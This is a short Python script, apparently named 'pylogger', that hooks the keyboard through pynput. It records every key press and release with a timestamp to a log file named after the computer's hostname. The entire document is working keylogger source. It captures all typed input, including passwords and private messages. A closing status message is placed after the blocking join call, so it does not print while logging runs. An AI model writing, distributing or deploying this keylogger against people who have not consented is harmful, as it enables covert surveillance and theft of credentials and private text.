from pynput import keyboard
from datetime import datetime
import platform

def print_character_info(character, info):
    info = f'{str(datetime.now().timestamp())} {character} {info}'
    print(info)
    with open(file_name, 'a') as file:
        file.write(info + '\n')

def on_press(character):
    print_character_info(character, 'PRESS')
    
def on_release(character):
    print_character_info(character, 'RELEASE')

file_name = f'pylogger_{platform.node()}_{str(datetime.now().replace(microsecond=0).timestamp())[:-2]}.log'
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()

print("Started pylogger")